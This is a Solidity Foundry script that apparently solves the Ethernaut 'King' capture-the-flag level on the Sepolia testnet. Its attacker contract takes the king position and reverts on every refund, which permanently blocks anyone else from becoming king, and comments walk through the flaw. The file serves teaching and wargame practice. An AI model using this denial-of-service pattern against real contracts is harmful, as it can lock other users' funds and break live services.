// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {King} from "../src/King.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0xa263219fc3618077d3c5adc584a383d771509143

contract KingSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/King.s.sol --tc KingSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    King kingInstance = King(payable(0xa263219fc3618077d3c5AdC584A383d771509143));
    KingAttack attackContract = KingAttack(payable(0x9c43eaFA2Fc2eA5d67b5Ee66c249C28D923142A6));

    function run() external {
        // Deploy Telephone contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(kingInstance) == address(0)) {
            kingInstance = _deployKingContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // We will deploy the attack contract, if we don't have one.
        // You can use our contract in your testing
        if (address(attackContract) == address(0)) {
            attackContract = new KingAttack(payable(address(kingInstance)));
            console.log("KingAttack address:", address(attackContract));
        }
        // - In `King` contract, you can become the king if you pay with an amount greater than the paid amount of the old king
        // - When a new king make a request, the contract transferes the old king price, and set update `king` and `prize` by the caller data
        // - If the old king can't accept ether, the tx will revert and no one will be able to overthrow the current king
        // - We will make a contract, then pay with amount greater than the old king amount to become the king
        // - In the contract, which is the king at this moment, will implement a receive function with a revert statment
        // - So if a new address wants to become the new king, the refunding proccess will revert, and no one will be able to take the king position.

        console.log("King:", kingInstance._king()); // First king (Owner)
        attackContract.attack{value: 0.04 ether}(); // The attacker sends more price and became the king
        console.log("King:", kingInstance._king()); // The attacker became the new king

        vm.stopBroadcast();

        // You can call this function to test that no one can be the king after the attack happened
        // NOTE: you need to run it after running attack, and not in the same time
        // _rebecomingTheKing();
    }

    function _deployKingContract() internal returns (King) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        King kingInstance = new King{value: 0.01 ether}();
        console.log("King address:", address(kingInstance));
        vm.stopBroadcast();
        return kingInstance;
    }

    function _rebecomingTheKing() internal {
        uint256 deployer = vm.envUint("PRIVATE_KEY"); // deployer (king contract owner) want to became the new king
        vm.startBroadcast(deployer);
        (bool success,) = payable(address(kingInstance)).call{value: 0.05 ether}("");
        if (!success) {
            console.log("Failed to become the new king");
        }
        vm.stopBroadcast();
    }
}

contract KingAttack {
    King kingInstance;

    constructor(address payable target) {
        kingInstance = King(target);
    }

    receive() external payable {
        revert("You can't be the king");
    }

    function attack() public payable {
        if (msg.value > kingInstance.prize()) {
            (bool success,) = payable(address(kingInstance)).call{value: msg.value}("");
            require(success);
        }
    }
}
